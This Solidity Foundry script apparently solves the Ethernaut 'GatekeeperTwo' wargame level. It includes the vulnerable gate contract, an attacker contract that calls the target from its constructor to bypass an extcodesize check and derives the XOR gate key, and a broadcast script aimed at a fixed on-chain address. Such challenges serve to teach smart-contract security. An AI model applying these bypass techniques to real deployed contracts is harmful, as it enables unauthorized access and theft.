// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hacker {
    constructor (address target) {
        GatekeeperTwo gatekeeper = GatekeeperTwo(target);
        bytes8 gateKey;
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = s ^ type(uint64).max;
        gateKey = bytes8(key);

        gatekeeper.enter(gateKey);
    }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        new Hacker(0x041BC2651a5f23B0212944c17d61645768eCf845);
        vm.stopBroadcast();
    }
}